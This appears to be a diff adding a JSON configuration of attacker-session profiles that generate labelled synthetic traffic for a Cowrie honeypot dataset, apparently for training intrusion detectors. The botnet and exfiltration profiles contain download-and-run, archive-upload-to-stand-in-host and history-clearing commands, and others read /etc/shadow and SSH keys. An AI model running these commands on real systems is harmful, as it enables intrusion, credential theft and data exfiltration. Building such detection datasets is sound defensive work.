@@ -1,0 +1,579 @@
+{
+  "version": "2.3.0-revised",
+  "description": "Revised V2 profiles (2026-11-10, task 12): shared command families across categories to reduce template fingerprints found by reports/v2_feature_leakage_validation/report.md, keeping each category's distinct behaviour. Cowrie-compatible (no ssh/scp, wget only to .example names). No per-profile timing: generator 2.1 uses one category-independent PacingPolicy. Design: docs/profile_redesign_v2.md.",
+  "placeholders": {
+    "ip": [
+      "192.0.2.10",
+      "198.51.100.20",
+      "203.0.113.30",
+      "192.0.2.40"
+    ],
+    "lan_ip": [
+      "192.0.2.5",
+      "192.0.2.12",
+      "198.51.100.10",
+      "203.0.113.8"
+    ],
+    "domain": [
+      "files.example",
+      "mirror.example",
+      "pkg-repo.example"
+    ],
+    "bin": [
+      "b.sh",
+      "malware.sh",
+      "update.sh",
+      "payload"
+    ],
+    "user": [
+      "support",
+      "sysbackup",
+      "ftpuser"
+    ],
+    "dir": [
+      "/tmp",
+      "/var/tmp",
+      "/dev/shm"
+    ]
+  },
+  "profiles": [
+    {
+      "name": "benign_admin",
+      "attack_cat": "benign",
+      "label": 0,
+      "held_out": false,
+      "description": "Ordinary administrator inspection and maintenance: load, disk, services, logs, a package-mirror reachability check.",
+      "credentials": {
+        "usernames": [
+          "admin",
+          "ubuntu",
+          "deploy"
+        ],
+        "passwords": [
+          "Adm1n#2026",
+          "Welcome@123",
+          "0psTeam#7"
+        ],
+        "failed_attempts": [
+          0,
+          1
+        ]
+      },
+      "steps": [
+        [
+          "uptime",
+          "w",
+          "who"
+        ],
+        [
+          "df -h",
+          "du -sh /var/log",
+          "free -m"
+        ],
+        {
+          "p": 0.7,
+          "cmd": [
+            "ps aux",
+            "ps aux | grep sshd"
+          ]
+        },
+        {
+          "p": 0.6,
+          "cmd": [
+            "systemctl status ssh",
+            "service cron status",
+            "service ssh status"
+          ]
+        },
+        {
+          "p": 0.5,
+          "cmd": [
+            "tail -n 50 /var/log/syslog",
+            "journalctl -n 20",
+            "ls -la /var/log | tail -n 5"
+          ]
+        },
+        {
+          "p": 0.4,
+          "cmd": [
+            "cat /etc/os-release",
+            "uname -r",
+            "hostname"
+          ]
+        },
+        {
+          "p": 0.3,
+          "cmd": [
+            "curl -I http://{domain}/",
+            "cat /etc/apt/sources.list"
+          ]
+        }
+      ],
+      "noise_pool": [
+        "pwd",
+        "clear",
+        "ls",
+        "date",
+        "id"
+      ],
+      "noise_count": [
+        0,
+        2
+      ],
+      "redesign_notes": [
+        "steps and noise rebuilt from shared command families; see docs/profile_redesign_v2.md"
+      ]
+    },
+    {
+      "name": "reconnaissance",
+      "attack_cat": "reconnaissance",
+      "label": 1,
+      "held_out": false,
+      "description": "Host fingerprinting after login: identity, kernel, users, network, processes, external-address check.",
+      "credentials": {
+        "usernames": [
+          "root",
+          "admin",
+          "user",
+          "test"
+        ],
+        "passwords": [
+          "admin",
+          "password",
+          "1234",
+          "toor"
+        ],
+        "failed_attempts": [
+          0,
+          2
+        ]
+      },
+      "steps": [
+        [
+          "whoami",
+          "id",
+          "w",
+          "groups"
+        ],
+        [
+          "uname -a",
+          "uname -r",
+          "cat /proc/version"
+        ],
+        {
+          "p": 0.8,
+          "cmd": [
+            "cat /etc/passwd",
+            "cat /etc/group",
+            "cat /etc/passwd | grep sh"
+          ]
+        },
+        {
+          "p": 0.7,
+          "cmd": [
+            "ifconfig",
+            "ip a",
+            "ip route",
+            "cat /etc/resolv.conf"
+          ]
+        },
+        {
+          "p": 0.6,
+          "cmd": [
+            "ps aux",
+            "ss -tulpn",
+            "netstat -antp"
+          ]
+        },
+        {
+          "p": 0.5,
+          "cmd": [
+            "hostname",
+            "cat /etc/issue",
+            "cat /etc/os-release"
+          ]
+        },
+        {
+          "p": 0.4,
+          "cmd": [
+            "lscpu",
+            "nproc",
+            "free -m",
+            "df -h"
+          ]
+        },
+        {
+          "p": 0.3,
+          "cmd": [
+            "curl -s http://{domain}/ip",
+            "wget -qO- http://{domain}/ip"
+          ]
+        }
+      ],
+      "noise_pool": [
+        "pwd",
+        "ls -la",
+        "ls"
+      ],
+      "noise_count": [
+        0,
+        2
+      ],
+      "redesign_notes": [
+        "steps and noise rebuilt from shared command families; see docs/profile_redesign_v2.md"
+      ]
+    },
+    {
+      "name": "brute_force",
+      "attack_cat": "brute_force",
+      "label": 1,
+      "held_out": false,
+      "description": "Credential guessing with several failed logins, then a short check or disconnect.",
+      "credentials": {
+        "usernames": [
+          "root",
+          "admin",
+          "pi",
+          "oracle"
+        ],
+        "passwords": [
+          "admin",
+          "raspberry",
+          "oracle",
+          "12345678"
+        ],
+        "failed_attempts": [
+          3,
+          5
+        ]
+      },
+      "steps": [
+        {
+          "p": 0.5,
+          "cmd": [
+            "uname -a",
+            "whoami",
+            "echo ok"
+          ]
+        }
+      ],
+      "noise_pool": [],
+      "noise_count": [
+        0,
+        0
+      ],
+      "redesign_notes": [
+        "unchanged: brute force stays authentication-oriented (3-5 rejected guesses, then an optional short check); commands are not added to balance features"
+      ]
+    },
+    {
+      "name": "botnet",
+      "attack_cat": "botnet",
+      "label": 1,
+      "held_out": false,
+      "description": "Mirai-style dropper: architecture check, writable directory, download attempt, make executable, run, clean up.",
+      "credentials": {
+        "usernames": [
+          "root",
+          "admin",
+          "support"
+        ],
+        "passwords": [
+          "admin",
+          "1234",
+          "support",
+          "default"
+        ],
+        "failed_attempts": [
+          0,
+          2
+        ]
+      },
+      "steps": [
+        [
+          "uname -a",
+          "uname -m",
+          "cat /proc/cpuinfo"
+        ],
+        [
+          "cd {dir}",
+          "cd /tmp || cd /var/tmp"
+        ],
+        [
+          "wget http://{domain}/{bin}",
+          "curl -O http://{domain}/{bin}",
+          "wget -q http://{domain}/{bin} -O {bin}"
+        ],
+        [
+          "chmod +x {bin}",
+          "chmod 777 {bin}"
+        ],
+        [
+          "./{bin}",
+          "sh {bin}"
+        ],
+        {
+          "p": 0.7,
+          "cmd": [
+            "rm -rf {bin}",
+            "rm {bin}"
+          ]
+        },
+        {
+          "p": 0.3,
+          "cmd": [
+            "history -c",
+            "unset HISTFILE"
+          ]
+        }
+      ],
+      "noise_pool": [
+        "enable",
+        "system",
+        "shell",
+        "id",
+        "w"
+      ],
+      "noise_count": [
+        0,
+        2
+      ],
+      "redesign_notes": [
+        "steps and noise rebuilt from shared command families; see docs/profile_redesign_v2.md"
+      ]
+    },
+    {
+      "name": "privilege_escalation",
+      "attack_cat": "privilege_escalation",
+      "label": 1,
+      "held_out": false,
+      "description": "Privilege inspection: identity and groups, sudo rights, SUID binaries, credential files, cron, kernel version.",
+      "credentials": {
+        "usernames": [
+          "user",
+          "www-data",
+          "guest"
+        ],
+        "passwords": [
+          "user",
+          "guest",
+          "password1"
+        ],
+        "failed_attempts": [
+          0,
+          1
+        ]
+      },
+      "steps": [
+        [
+          "id",
+          "whoami",
+          "groups"
+        ],
+        [
+          "sudo -l",
+          "cat /etc/sudoers"
+        ],
+        {
+          "p": 0.8,
+          "cmd": [
+            "find / -perm -4000 -type f 2>/dev/null",
+            "find / -perm -u=s -type f 2>/dev/null",
+            "ls -la /usr/bin | grep rws"
+          ]
+        },
+        {
+          "p": 0.7,
+          "cmd": [
+            "cat /etc/shadow",
+            "ls -la /etc/shadow",
+            "ls -la /etc/passwd"
+          ]
+        },
+        {
+          "p": 0.6,
+          "cmd": [
+            "find / -name id_rsa 2>/dev/null",
+            "ls -la /root/.ssh",
+            "ls -la ~/.ssh"
+          ]
+        },
+        {
+          "p": 0.5,
+          "cmd": [
+            "cat /etc/crontab",
+            "crontab -l",
+            "ls -la /etc/cron.d"
+          ]
+        },
+        {
+          "p": 0.4,
+          "cmd": [
+            "uname -r",
+            "cat /proc/version"
+          ]
+        }
+      ],
+      "noise_pool": [
+        "ls -la",
+        "pwd",
+        "w"
+      ],
+      "noise_count": [
+        0,
+        2
+      ],
+      "redesign_notes": [
+        "steps and noise rebuilt from shared command families; see docs/profile_redesign_v2.md"
+      ]
+    },
+    {
+      "name": "lateral_movement",
+      "attack_cat": "lateral_movement",
+      "label": 1,
+      "held_out": false,
+      "description": "Lateral reconnaissance only (isolated Cowrie cannot represent a connection to another host): neighbour discovery, known hosts, history, SSH configuration, reachability probes.",
+      "credentials": {
+        "usernames": [
+          "root",
+          "admin",
+          "svc_backup"
+        ],
+        "passwords": [
+          "Summer2026!",
+          "admin@123",
+          "backup"
+        ],
+        "failed_attempts": [
+          0,
+          1
+        ]
+      },
+      "steps": [
+        [
+          "ip route",
+          "arp -a",
+          "cat /etc/hosts",
+          "cat /etc/hosts | grep -v '^#'"
+        ],
+        {
+          "p": 0.8,
+          "cmd": [
+            "cat ~/.ssh/known_hosts",
+            "cat ~/.bash_history",
+            "cat ~/.bash_history | grep ssh"
+          ]
+        },
+        {
+          "p": 0.7,
+          "cmd": [
+            "ping -c 2 {lan_ip}",
+            "nc -zv {lan_ip} 22"
+          ]
+        },
+        {
+          "p": 0.6,
+          "cmd": [
+            "cat ~/.ssh/config",
+            "ls -la ~/.ssh"
+          ]
+        },
+        {
+          "p": 0.5,
+          "cmd": [
+            "netstat -antp",
+            "ss -tan",
+            "w"
+          ]
+        },
+        {
+          "p": 0.4,
+          "cmd": [
+            "nmap -sn 192.0.2.0/24"
+          ]
+        }
+      ],
+      "noise_pool": [
+        "whoami",
+        "hostname",
+        "id"
+      ],
+      "noise_count": [
+        0,
+        1
+      ],
+      "redesign_notes": [
+        "steps and noise rebuilt from shared command families; see docs/profile_redesign_v2.md"
+      ]
+    },
+    {
+      "name": "data_exfiltration",
+      "attack_cat": "exfiltration",
+      "label": 1,
+      "held_out": true,
+      "description": "Attempted exfiltration: locate data, stage an archive, attempt an HTTP upload, clean up. Cowrie records the attempt; no transfer succeeds in the isolated lab.",
+      "credentials": {
+        "usernames": [
+          "root",
+          "backup"
+        ],
+        "passwords": [
+          "backup123",
+          "admin2026"
+        ],
+        "failed_attempts": [
+          0,
+          1
+        ]
+      },
+      "steps": [
+        [
+          "find / -name '*.sql' 2>/dev/null",
+          "find /home -name '*.db' 2>/dev/null",
+          "ls -la /home"
+        ],
+        {
+          "p": 0.7,
+          "cmd": [
+            "du -sh /home /var/www",
+            "ls -la /var/backups",
+            "df -h"
+          ]
+        },
+        [
+          "tar czf {dir}/d.tgz /home",
+          "tar cf {dir}/d.tar /var/www"
+        ],
+        {
+          "p": 0.8,
+          "cmd": [
+            "curl -T {dir}/d.tgz http://{ip}/u",
+            "curl -T {dir}/d.tgz http://{domain}/u"
+          ]
+        },
+        {
+          "p": 0.5,
+          "cmd": [
+            "rm -f {dir}/d.tgz {dir}/d.tar"
+          ]
+        }
+      ],
+      "noise_pool": [
+        "id",
+        "ls",
+        "whoami"
+      ],
+      "noise_count": [
+        0,
+        2
+      ],
+      "redesign_notes": [
+        "steps and noise rebuilt from shared command families; see docs/profile_redesign_v2.md"
+      ]
+    }
+  ],
+  "derived_from": {
+    "file": "dataset_builder/profiles_v2_compat.json",
+    "version": "2.2.0-compat"
+  }
+}
